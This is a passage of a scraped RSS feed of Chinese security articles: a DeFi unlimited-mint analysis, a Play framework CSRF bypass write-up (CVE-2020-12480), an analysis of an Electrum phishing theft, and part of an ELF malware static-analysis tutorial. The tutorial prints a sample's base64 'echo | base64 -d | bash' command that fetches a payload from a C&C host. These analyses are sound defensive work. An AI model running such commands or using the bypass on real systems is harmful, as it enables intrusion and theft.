src=\"https://pic.36krcnd.com/202009/02013349/v6w22ba0eplyepgt\"/></section><p>以上三截图均出自：https://etherscan.io/address/0x450f143f1a8650fff968d890814bd5884bdc8f1d#code<br/></p><p>拥有devaddr身份的调用者，当其身份恰好同时为owner身份的时候，可以通过调用MasterChef.sol智能合约1282行的mint方法，来无限制的增发代币。1282行的mint方法会继续调用1130行的mint方法，并继续由1130行mint方法调用1044行的_mint方法，并最终完成代币增发的操作。</p><p>&#160;Kimichi项目智能合约中存在的无限增发漏洞与以上漏洞基本相同，因此在这里不进行重复叙述。</p><p>如果owner和devaddr的地址如果相同，那么在外部没有对智能合约拥有者限制的情况下，智能合约拥有者拥有权利增发任意数量的代币，这将会将投资者置于风险之中。那么Yuno和Kimichi这两个项目中的devaddr和owner是否为同一人呢？是否有其他外部制约机制可以限制这两个项目的智能合约拥有者呢？</p><p>下图为Yuno项目MasterChef.sol智能合约中拥有devaddr和owner身份的地址（截止北京时间9月1日晚11点）。</p><p><img src=\"https://pic.36krcnd.com/202009/02013349/y2qinvwe489edayb\"/>截图出自：https://etherscan.io/address/0x9dd5b5c71842a4fd51533532e5470298bfa398fd#readContract<br/></p><p>下图为Kimichi项目中KimchiChef.sol智能合约中拥有devaddr和owner身份的地址（截止北京时间9月1日晚11点）。<br/></p><p><img src=\"https://pic.36krcnd.com/202009/02013349/o2gtl5anjct7lab9\"/>截图出自：https://etherscan.io/address/0x9dd5b5c71842a4fd51533532e5470298bfa398fd#readContract</p><p>从上两图中可以看到，Yuno项目中拥有devaddr和owner身份的地址为同一个，因此其智能合约拥有者有权利进行无限制的代币增发。而Kimichi项目中拥有devaddr和owner身份不同，但由于devaddr的身份可以进行转移，因此也存在一定的风险。</p><p><span style=\"font-size: 20px;\"><strong>目前措施</strong></span></p><p>为了确保无限增发漏洞不会被触发，对于Yuno和Kimichi两个项目的智能合约拥有者必须由外部进行限制。当前已经实施的限制条件与Sushiswap项目一致，即对任何由智能合约拥有者进行的智能合约操作，均有48小时的延迟。任何来自智能合约拥有者的操作都会被所有投资者观察到，并有48小时进行应对操作。</p><p><span style=\"font-size: 20px;\"><strong>建议</strong></span></p><p><strong>·&#160;</strong>当前DeFi以及相关Farming项目异常火爆，由于区块链项目对于项目代码公开性有要求，因此上线新项目门槛极低。如果盲目借鉴其他项目，任意漏洞都可能被引入到项目中。因此在项目上线之前，应该对项目进行严格的安全审计。</p><p><strong style=\"white-space: normal;\">·&#160;</strong>从投资者角度，当前Farming项目动辄百分之几千的回报率，极易促使投资者在没有对项目本身有足够了解的情况下进行盲目投资。例如SushiSwap，Yuno以及Kimchi三个项目均没有经过严谨的安全验证就快速上线。投资者可能会被巨大的利益回报迷惑，将宝贵资金投入到有极大风险的智能合约中。</p>","descriptionType":"text/html","publishedDate":"Wed, 02 Sep 2020 09:00:00 +0000","feedId":6942,"bgimg":"https://pic.36krcnd.com/202009/02013349/14k2p3njv3hbk0yu","linkMd5":"6065d354c99cc3ce6980c438cf2d40b5","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn35@2020_1/2020/09/05/07-30-57-449_f0554844f863fb68.webp","destWidth":1080,"destHeight":459,"sourceBytes":196865,"destBytes":44988,"author":"CertiK","articleImgCdnMap":{"https://pic.36krcnd.com/202009/02013349/14k2p3njv3hbk0yu":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn35@2020_1/2020/09/05/07-30-57-449_f0554844f863fb68.webp","https://pic.36krcnd.com/202009/02013349/sku0pcj6irct3l2o":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn11@2020_1/2020/09/05/07-31-22-682_421b83b4ec969a06.webp","https://pic.36krcnd.com/202009/02013349/sl7mt8az6biva72j":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn100@2020_6/2020/09/05/07-31-18-193_2fdaa967b4d39340.webp","https://pic.36krcnd.com/202009/02013349/t8uycj2uf0f1iugn":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn89@2020_1/2020/09/05/07-31-20-332_7d8c5a96bd32f640.webp","https://pic.36krcnd.com/202009/02013349/87f3dzgqkw75bq94":null,"https://pic.36krcnd.com/202009/02013349/v6w22ba0eplyepgt":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn68@2020_1/2020/09/05/07-31-20-972_b3fb9780b8d8e06b.webp","https://pic.36krcnd.com/202009/02013349/y2qinvwe489edayb":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn39@2020_4/2020/09/05/07-31-23-363_0612cdf0c50d7228.webp","https://pic.36krcnd.com/202009/02013349/o2gtl5anjct7lab9":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn83@2020_1/2020/09/05/07-31-18-283_178c139312e4ddcf.webp"},"publishedOrCreatedDate":1599291056255},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"如何绕过Play框架中的CSRF保护（CVE-2020-12480漏洞）","link":"https://www.4hou.com/posts/mG90","description":"<p style=\"text-align: left;\">我会在这篇文章介绍一个影响Play框架的漏洞，此漏洞允许在特定配置下绕过完整的跨站点请求伪造(CSRF)保护。play 框架是一个full-stack（全栈的）Java Web的应用框架，包括一个简单的无状态MVC模型，具有Hibernate的对象持续，一个基于Groovy的模板引擎，以及建立一个现代Web应用所需的所有东西。<br/></p><p style=\"text-align: left;\">不过在攻击者眼中，Play框架是一个针对java和scala的高速web框架。它构建在Akka之上，Akka是一个工具包，用于为Java和Scala构建高度并发、分布式和弹性的消息驱动应用程序。</p><p style=\"text-align: left;\">Play是一种广泛使用的框架，并且已部署到大型和小型组织的Web平台上，例如Verizon，Walmart，The Guardian，LinkedIn，Samsung等。</p><p><span style=\"font-size: 20px;\"><strong>较早版本的反csrf机制</strong></span></p><p style=\"text-align: left;\">在较早版本的框架中，CSRF保护是由一种不安全的基线机制提供的，即使在HTTP请求中没有出现CSRF令牌时也是如此。</p><p style=\"text-align: left;\">这种机制基于简单请求和完整请求之间的基本区别，简单请求具有严格的规则集，只要遵循这些规则，即使通过XMLHttpRequest，用户代理（例如浏览器）也不会发出OPTIONS请求。尽管我们主要对Content-Type规则集感兴趣，但可以在此Mozilla的开发人员页面上看到所有规则和详细信息。</p><p style=\"text-align: left;\">简单请求的Content-Type标头可以包含以下三个值的一个:</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074498520844.png\" title=\"1598074224134254.png\" alt=\"1.png\"/></p><p style=\"text-align: left;\">如果你指定了不同的内容类型，比如application/json，那么浏览器将发送一个选项请求来验证web服务器是否允许这样的请求。</p><p style=\"text-align: left;\">现在我们了解了完整请求和简单请求之间的区别，可以继续了解Play是如何抵御CSRF攻击的。</p><p style=\"text-align: left;\">在该框架的旧版本中(包括2.5版本之前)，在接收内容类型报头时使用黑名单方法作为CSRF预防机制。</p><p style=\"text-align: left;\">在2.8.x迁移指南中，我们可以看到用户如何根据旧版系统或其他依赖项的要求恢复Play的原有默认行为：</p><p><span style=\"font-size: 20px;\"><strong>application.conf</strong></span></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074498662555.png\" title=\"1598074253352761.png\" alt=\"2.png\"/></p><p style=\"text-align: left;\">在上面的代码片段中，我们可以看到原有保护的核心。contentType.blackList设置包含三个值，它们与“simple requests”的内容类型相同。由于防止了以下情况，因此已将其视为有效的（尽管不是理想的）保护：</p><p style=\"text-align: left;\">1.Attacker.com嵌入</p><p style=\"text-align: left;\">2.Attacker.com使用XHR通过application / json将其发布到victim.com，由于application / json不是一个“simple request”，因此将发送一个OPTIONS，并且CORS将阻止该请求（假设配置正确）。</p><p style=\"text-align: left;\">3. victim.com使用XHR将application / json发布到victim.com，由于请求不是跨站点的，而是在同一个域内，因此它应能正常工作。</p><p style=\"text-align: left;\">以上就是CSRF保护的机制。</p><p><span style=\"font-size: 20px;\"><strong>如何绕过</strong></span></p><p style=\"text-align: left;\">有了以上这些知识铺垫，首先想到的就是我们需要使浏览器发出一个不会触发预检并且与contentType.blackList设置中的任何值都不匹配的请求。</p><p style=\"text-align: left;\">我们要做的第一件事是绘制出可以在不发送OPTIONS预检的情况下进行修改的请求，这还可以归结为一个请求：Content-Type：multipart / form-data。</p><p style=\"text-align: left;\">使用边界值Content-Type: multipart/form-data; boundary=something，会立即显得很有趣。详细描述可以在<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type\" target=\"_self\">这里</a>找到：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074498165746.png\" title=\"1598074275145077.png\" alt=\"3.png\"/></p><p style=\"text-align: left;\">因此，我们有一个字段，实际上可以修改与许多不同的字符，它是所有攻击控制。</p><p style=\"text-align: left;\">现在我们需要深入分析这些头，为了做到这一点，我们需要看一下Play框架所基于的Akka HTTP。</p><p style=\"text-align: left;\">查看HttpHeaderParser.scala，我们可以看到这些标头始终是被解析的：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074499167890.png\" title=\"1598074301353898.png\" alt=\"4.png\"/></p><p style=\"text-align: left;\">解析规则可以在HeaderParser.scala中看到，该文件遵循RFC 7230超文本传输协议（HTTP / 1.1）：消息语法和路由，2014年6月。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074499363556.png\" title=\"1598074318125673.png\" alt=\"5.png\"/></p><p style=\"text-align: left;\">如果不遵守这些解析规则，则该值将设置为None。完美!这正是我们绕过CSRF保护所需要的一个“简单请求”，然后将其设置为None，从而绕过黑名单。</p><p style=\"text-align: left;\">我们如何伪造一个被浏览器允许，但Akka HTTP解析代码认为无效的请求呢?</p><p style=\"text-align: left;\">于是我们决定模糊化这个请求，并很快发现下面的转换是有效的:</p><pre class=\"brush:html;toolbar:false\">Content-Type:&#160;multipart/form-data;&#160;boundary=—some;randomboundaryvalue</pre><p style=\"text-align: left;\">在边界值内加一个分号就可以了，它会把请求标记为非法:</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074500199467.png\" title=\"1598074378101125.png\" alt=\"6.png\"/></p><p><span style=\"font-size: 20px;\"><strong>响应</strong></span></p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074500289031.png\" title=\"1598074392883913.png\" alt=\"7.png\"/></p><p style=\"text-align: left;\">通过在开发模式下查看服务器的日志也可以确认这一点：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074500169617.png\" title=\"1598074403192939.png\" alt=\"8.png\"/></p><p style=\"text-align: left;\">并且通过检测Play框架代码来打印Content-Type的值:</p><pre class=\"brush:html;toolbar:false\">Content-Type:&#160;None</pre><p style=\"text-align: left;\">最后，我们构建了以下概念验证并通知了Play框架维护人员：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074501280860.png\" title=\"1598074416119254.png\" alt=\"11.png\"/></p><p style=\"text-align: left;\">此漏洞已在Play 2.8.2和2.7.5中修复，且在2020年8月10日被命名为<a href=\"https://www.playframework.com/security/vulnerability/CVE-2020-12480-CsrfBlacklistBypass\" target=\"_self\">CVE-2020-12480</a> 。</p>","descriptionType":"text/html","publishedDate":"Fri, 04 Sep 2020 02:10:00 +0000","feedId":6942,"bgimg":"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074498520844.png","linkMd5":"7c030266888b48c212298d4439949659","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn63@2020_5/2020/09/05/07-31-00-353_49e553efb44b0760.webp","destWidth":377,"destHeight":68,"sourceBytes":1743,"destBytes":2800,"author":"gejigeji","articleImgCdnMap":{"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074498520844.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn63@2020_5/2020/09/05/07-31-00-353_49e553efb44b0760.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074498662555.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn86@2020_2/2020/09/05/07-31-26-552_e05332270084dcf4.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074498165746.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn79@2020_5/2020/09/05/07-31-20-319_77dbad51816171c5.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074499167890.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn90@2020_5/2020/09/05/07-31-24-186_3605270a8e0359c2.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074499363556.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn59@2020_3/2020/09/05/07-31-24-124_925a7ef214a418a2.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074500199467.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn42@2020_6/2020/09/05/07-31-28-331_7ec7d9600e611c93.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074500289031.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn12@2020_4/2020/09/05/07-31-30-173_77dd24913f0baa07.webp","https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074500169617.png":null,"https://img.4hou.com/uploads/ueditor/php/upload/image/20200822/1598074501280860.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn68@2020_2/2020/09/05/07-31-21-505_5028c1cfa713d437.webp"},"publishedOrCreatedDate":1599291056254},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"CertiK：Github用户1400枚比特币被盗事件分析","link":"https://www.4hou.com/posts/62w9","description":"<p style=\"text-align:center\"><img src=\"https://pic.36krcnd.com/202009/03020337/pkehprr73i5i31fd\"/></p><p style=\"text-align: left;\">北京时间8月31日，CertiK天网系统 (Skynet) 检测到，Github用户“1400BitcoinStolen”1400枚比特币被盗事件的代币，已开始被输送到多个不同的地址当中。<br/></p><p></p><section>受害者在electrum的Github issue中讲述了自己丢失了1400个比特币并贴出了自己的比特币钱包地址.</section><section></section><section>在区块链浏览器(参考链接3)中可以看到8月30日一共1404枚BTC（价值1670万美元）从他的钱包中被取出，存入了黑客的钱包中。</section><section><img src=\"https://pic.36krcnd.com/202009/03020337/c1karuqzbavq3ibk\"/></section><section><br/></section><p></p><p><span style=\"font-size: 20px;\"><strong>事件还原与分析</strong></span></p><p></p><section></section><section>该用户使用的是Electrum比特币钱包，上次使用是在2017年。此后Electrum已经发布了安全更新，但该用户一直没有安装。</section><section>用户在使用Electrum进行交易时，钱包会向服务器广播一笔交易，如果这笔交易出现了问题，服务器将返回错误信息并以弹窗的形式展现给用户。</section><section>3.3.2版本之前的Electrum钱包不会对服务器返回的错误信息进行验证，甚至还会对返回的信息进行html渲染（参考链接4）。</section><section>值得一提的是，任何人都可以去搭建一个Electrum节点服务器。如果一个用户连接到了攻击者的服务器并发起了一笔交易，服务器可以返回任何设计好的错误信息。比如返回一个让用户去更新Electrum钱包的错误信息，如下图所示。</section><section><img src=\"https://pic.36krcnd.com/202009/03020337/7h99393l0329sq5g\"/></section><section>然而，图中的链接指向了攻击者自己写的恶意软件，一旦用户下载安装该软件并把自己的钱包导入其中，钱包里所有的比特币就会被攻击者转走。</section><section>这其实本质上是一种钓鱼攻击，但由于攻击者发出的钓鱼信息是通过Electrum官方钱包展示出来的，很多人都会信以为真。</section><section>在本次事件中，受害者的钱包连接上了攻击者所控制的服务器，导致其收到了服务器发出的钓鱼信息，进而被攻击者转走了自己的所有比特币。</section><section>Electrum钱包存在的该问题早在2018年底就引起了广泛讨论(参考链接4)。</section><section>Electrum官方在2019年，钱包版本3.3.4中对该问题进行了修复，后续版本的Electrum钱包不再会将服务器返回的内容直接展示给用户，也不会对其进行html渲染。</section><section>此外，由于旧版本的钱包仍然存在这个问题，因此所有的正常的服务器会对3.3版本之前的钱包进行拒绝服务（DoS）攻击，以强制用户进行更新（参考链接5）。</section><p></p><p><span style=\"font-size: 20px;\"><strong>建议</strong></span></p><p></p><section></section><p></p><p><strong>· </strong>用户在使用钱包进行交易的时候，需确保钱包为最新版本，已防旧版本的钱包可能存在可被黑客利用的漏洞。</p><p><strong>·&#160;</strong>用户在下载钱包更新的时候要注意验证下载URL是否与官方一致，在下载完成后要对钱包的签名进行验证。</p><p><strong>·</strong><strong style=\"color: rgb(51, 51, 51); font-family: &#34;Segoe UI&#34;, &#34;Lucida Grande&#34;, Helvetica, Arial, &#34;Microsoft YaHei&#34;, FreeSans, Arimo, &#34;Droid Sans&#34;, &#34;wenquanyi micro hei&#34;, &#34;Hiragino Sans GB&#34;, &#34;Hiragino Sans GB W3&#34;, FontAwesome, sans-serif; white-space: normal;\">&#160;</strong>对于钱包开发团队，需要寻找专业团队做好测试工作，以免项目出现漏洞给用户带来损失。</p><p style=\"text-align: center;\"><img src=\"https://pic.36krcnd.com/202009/03020338/f9cc27dsszclx3al\"/></p><p>参考链接：</p><p>1. https://github.com/spesmilo/electrum/issues/5072</p><p>2. https://zhuanlan.zhihu.com/p/53920688</p><p>3. https://www.blockchain.com/btc/tx/2db616f5b4545805dc1de59bc65b21b548c0d553ab187fa1625ef73c727f1e54</p><p>4. https://github.com/spesmilo/electrum/issues/4968</p><p>5. http://twitter.com/electrumwallet/status/1106479573917724672</p><p></p><p></p><p></p><p></p><p></p><p></p>","descriptionType":"text/html","publishedDate":"Thu, 03 Sep 2020 07:09:20 +0000","feedId":6942,"bgimg":"https://pic.36krcnd.com/202009/03020337/pkehprr73i5i31fd","linkMd5":"d4990d794912cd0e310810f1323b377f","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn67@2020_2/2020/09/05/07-30-58-294_eb78c56c01163458.webp","destWidth":1080,"destHeight":460,"sourceBytes":169556,"destBytes":27972,"author":"CertiK","articleImgCdnMap":{"https://pic.36krcnd.com/202009/03020337/pkehprr73i5i31fd":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn67@2020_2/2020/09/05/07-30-58-294_eb78c56c01163458.webp","https://pic.36krcnd.com/202009/03020337/c1karuqzbavq3ibk":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn56@2020_3/2020/09/05/07-31-17-740_17078015c073258a.webp","https://pic.36krcnd.com/202009/03020337/7h99393l0329sq5g":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn34@2020_2/2020/09/05/07-31-16-121_67c659c62af7d472.webp","https://pic.36krcnd.com/202009/03020338/f9cc27dsszclx3al":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn24@2020_5/2020/09/05/07-31-25-014_9e5f675693c28365.webp"},"publishedOrCreatedDate":1599291056254},{"createdTime":"2020-09-05 15:30:56","updatedTime":"2020-09-05 15:30:56","title":"ELF恶意软件的静态分析原理和方法（下）","link":"https://www.4hou.com/posts/p7j6","description":"<p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239922418869.jpeg\" title=\"1598191435176773.jpeg\" alt=\"shutterstock_282380951-1-1024x475.jpg\"/></p><p style=\"text-align: left;\"><a href=\"https://www.4hou.com/posts/o7gK\" target=\"_blank\" title=\"https://www.4hou.com/posts/o7gK\">上一篇文章</a>，我们介绍了ELF恶意软件的威胁概况和背景信息，本文，我们会具体用一个样本进行静态分析。</p><p><span style=\"font-size: 20px;\"><strong>ELF标头</strong></span></p><p style=\"text-align: left;\">ELF标头包含有关二进制文件的常规数据，例如二进制文件的入口点和程序标头表的位置。这些信息在初始文件分析过程中并不重要，但是文件的体系结构可以帮助我们了解文件设计在哪台计算机上运行，这样可以防止我们运行文件。</p><p style=\"text-align: left;\">让我们运行readelf -h training-sample来查看样本的标题信息：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239923982091.jpeg\" title=\"1598192146526075.jpeg\" alt=\"10.webp.jpg\"/></p><p style=\"text-align: left;\">有几种先进的恶意软件技术可以利用ELF标头的结构。</p><p><span style=\"font-size: 20px;\"><strong>文件输出</strong></span></p><p>仅在VM上运行文件总是很有用的，如果文件显示输出，则可能会立即帮助我们确定它是什么。注意：在运行文件之前，请确保已保存虚拟机的截屏。</p><p><span style=\"font-size: 20px;\"><strong>字符串</strong></span></p><p style=\"text-align: left;\">字符串提取是收集二进制文件信息的一种经典而强大的方法，为了方便起见，让我们在文件上运行strings命令，然后将字符串提取到txt文件中：strings training-sample &#62; str.txt。</p><p style=\"text-align: left;\">当我们查看字符串时，我们将在代码中看到声明的字符以及与文件格式相关的符号和其他字符串，例如节名和请求的解析器。</p><p style=\"text-align: left;\">就像在PE分析中一样，我们可以搜索指示性字符串，如网络相关字符串、编码字符串(如base64或hex)、路径、命令和其他独特的关键字，这些关键字可以帮助我们更多地了解文件。</p><p style=\"text-align: left;\">在训练文件中，包含base64命令字符串的echo命令字符串会立即显示出来：</p><pre class=\"brush:html;toolbar:false\">echo&#160;d2dldCBodHRwOi8vc29tZW5vbmV4aXRpbmdjbmNbLl1jb20vbWFsd2FyZS5hcHA=|base64&#160;-d&#160;|bash;</pre><p style=\"text-align: left;\">如果我们解码base64字符串，我们将收到以下命令：</p><pre class=\"brush:html;toolbar:false\">wget&#160;http://somenonexitingcnc[.]com/malware.app</pre><p style=\"text-align: left;\">我们可以假设该文件从远程C＆C删除了有效载荷。</p><p><span style=\"font-size: 20px;\"><strong>字符串重用</strong></span></p><p style=\"text-align: left;\">Intezer Analyze是用于字符串提取的有用工具。通过透露在其他文件中之前是否曾见过某些字符串，它减少了分析工作。在未知恶意软件的情况下，过滤常见字符串可以帮助我们将精力集中在文件的唯一字符串上。</p><p style=\"text-align: left;\">例如：Lazarus的ManusCrypt ELF版本包含在其PE版本中找到的一些相同字符串，美国政府先前曾报道过：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239924825697.jpeg\" title=\"1598192160133150.jpeg\" alt=\"11.webp.jpg\"/></p><p style=\"text-align: left;\">你可以使用Intezer Analyze中的相关样本轻松浏览PE版本以比较两个文件：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239925586990.jpeg\" title=\"1598192171222983.jpeg\" alt=\"12.webp.jpg\"/></p><p><span style=\"font-size: 20px;\"><strong>代码重用</strong></span></p><p style=\"text-align: left;\">在Intezer Analyze中检查代码重用可能是初始分析的一个很好的起点，通过公开以前在其他文件中使用过某些代码的位置，可以缩短分析时间。</p><p style=\"text-align: left;\">例如：</p><p style=\"text-align: left;\">该Rekoobe样本在VirusTotal中检测到0个。在上传到Intezer Analyze后，我们会根据对先前示例的代码重用收到明确的结论（恶意）和分类（Rekoobe）。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239927551825.png\" title=\"1598192183116994.png\" alt=\"13.png\"/></p><p><span style=\"font-size: 20px;\"><strong>packer</strong></span></p><p style=\"text-align: left;\">与PE恶意软件不同的是，PE恶意软件通常使用逃避性和非固定性packer（多态自定义packer）封装已知的有效载荷，这在ELF恶意软件中很少见。一种解析可能是，安全公司与恶意软件开发人员之间正在进行的“网络安全攻防”游戏仍处于起步阶段，因为公司开始为其系统采用针对Linux的检测和保护平台。</p><p style=\"text-align: left;\">但是，著名的UPX被ELF恶意软件开发人员广泛使用。在本节中，我们将回顾ELFpacker，确定如何识别文件是否已封装，并了解如果文件确实已封装，我们下一步将采取什么措施。我们将重点介绍UPX和VMprotect，因为它们是最常用的packer。</p><p><span style=\"font-size: 20px;\"><strong>Vanilla UPX</strong></span></p><p style=\"text-align: left;\">带有Vanilla UPX的文件易于检测和解压缩，将样本文件与UPX封装在一起（你可以在<a href=\"https://github.com/intezer/ELF-Malware-Analysis-101/raw/master/Part-2-Initial-Analysis/Article-samples/training-sample-static-packed\" target=\"_self\">此处</a>下载编译后的文件表格）：</p><p style=\"text-align: left;\">1.首先，我们必须通过将其编译为静态链接的二进制文件来增大文件的大小（UPX具有最小文件，并且该文件当前太小）。</p><p style=\"text-align: left;\">gcc -static training_sample.c -o training-sample-static</p><p style=\"text-align: left;\">2.运行：upx -9 training-sample-static -o training-sample-static-packed</p><p style=\"text-align: left;\">运行readelf -a training-sample-static-packed以检索文件的数据，你会注意到只有标题表和段表。这些表对于文件运行是必需的。段表仅包含PT_LOAD和PT_GNU_STACK段，这是段表结构中的异常，可能表明文件已被封装。</p><p style=\"text-align: left;\">让我们在文件上运行strings命令，注意，大多数字符串都是杂乱的，但是，有迹象表明该文件已封装到UPX中。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239928104790.png\" title=\"1598192353157944.png\" alt=\"14.png\"/></p><p style=\"text-align: left;\">这些字符串以及文件的表结构表明文件可能与UPX封装在一起。</p><p style=\"text-align: left;\">现在，让我们使用“轻松检测（DIE）”工具。 DIE是一种基于签名的工具，可以检测文件的编译器、链接器、packer等。使用此工具打开文件，你将看到它立即将文件标识为UPX封装。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239929829443.png\" title=\"1598192341425313.png\" alt=\"15.png\"/></p><p style=\"text-align: left;\">现在，让我们看看DIE的熵功能：</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239929567599.png\" title=\"1598192323133411.png\" alt=\"16.png\"/></p><p style=\"text-align: left;\">如果文件包含Vanilla UPX，请运行以下命令将其解压缩：</p><p style=\"text-align: left;\">upx -d training-sample-static-packed，然后使用解压缩的文件继续进行分析。</p><p><span style=\"font-size: 20px;\"><strong>自定义UPX</strong></span></p><p style=\"text-align: left;\">由于UPX是开源的，因此很容易在封装过程中进行修改并添加高级图层。为了检测自定义UPX封装的文件，我们可以使用与Vanilla UPX相同的检测方法。但是，可能并不总是有一个指示性字符串可以揭示文件可能与UPX封装在一起。例如，Rocke使用LSD！而不是原始的UPX！标头。尽管这是“自定义UPX”中最简单的技巧，但它可以很容易地避开静态解析器。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239930154928.png\" title=\"1598192313840328.png\" alt=\"17.png\"/></p><p style=\"text-align: left;\">代码重用还可以简化packer的检测，查看此修改后的UPX示例。它不包含任何字符串签名，但是如果我们在Intezer Analyze中将其打开，则很明显该文件包含修改后的UPX。</p><p style=\"text-align: left;\">带有修改后的UPX的文件很可能不会使用upx -d命令解压缩。在这种情况下，我们应该进行动态分析。</p><p><span style=\"font-size: 20px;\"><strong>虚拟机保护（VMprotect）</strong></span></p><p style=\"text-align: left;\">VMprotect packer是一个流行的PE文件打包选择，它也有一个ELF文件封装解决方案。你可以使用演示版自己尝试，执行以下命令以将VMprotect下载到你的VM上并运行它（在<a href=\"https://raw.githubusercontent.com/intezer/ELF-Malware-Analysis-101/master/Part-2-Initial-Analysis/Article-samples/training-sample.vmp.app\" target=\"_self\">此处</a>下载编译的文件格式）：</p><p style=\"text-align: left;\">VMprotect GUI应该打开，选择“Open..”&#160;，然后选择“ training-sample.app”。</p><p style=\"text-align: left;\">看一下“选项”设置中的“VM段”，该“.vmp”字段可以更改为用户决定的任何值。我们将其更改为“cat”。接下来，点击播放按钮。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239930167819.png\" title=\"1598192458112767.png\" alt=\"18.png\"/></p><p style=\"text-align: left;\">该程序已在你的工作目录上创建了一个封装样本。运行readelf -l training-sample.vmp.app以查看封装文件的分段。请注意，文件现在具有带有RWE标志的PT_LOAD段，并且文件的入口点位于该段内（入口点地址应位于该段的虚拟地址与其内存大小之间的某个位置）。你可以看到VMprotect部分cat1也位于此段内。</p><p style=\"text-align: left;\">运行readelf -S training-sample.vmp.app以查看文件的各个部分。</p><p style=\"text-align: center;\"><img src=\"https://img.4hou.com/uploads/ueditor/php/upload/image/20200824/1598239931187738.png\" title=\"1598192518156619.png\" alt=\"19.png\"/></p><p style=\"text-align: left;\">VMprotect将创建两个新的节，它们的名称和后缀分别为1和0。段名和RWE段结合高熵可以揭示一个文件是用VMprotect封装的。如果一个文件是用VMprotect封装的，我们应该继续进行动态分析。</p><p style=\"text-align: left;\">注意：如果你查看这些符号，则将看到与有效载荷相关的功能和变量不再出现在表格中。考虑到有效载荷已被封装，并且我们现在正在分析的文件是packer，而不是有效载荷，这很有意义。</p><p style=\"text-align: left;\">我们怀疑文件包含以下内容：</p><p style=\"text-align: left;\"><strong>·&#160;</strong>Packer代码重用；</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>高熵；</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>段异常；</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>大量乱码；</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>Packer签名，例如UPX字符串和VMprotect段名称。</p><p style=\"text-align: left;\">接下里要做的是：</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>如果有解压缩解决方案，我们将解压缩文件并进行分析；</p><p style=\"text-align: left;\"><strong style=\"white-space: normal;\">·&#160;</strong>如果没有可用的解压解决方案，我们将继续进行动态分析；</p><p><span style=\"font-size: 20px;\"><strong>解析器</strong></span></p><p style=\"text-align: 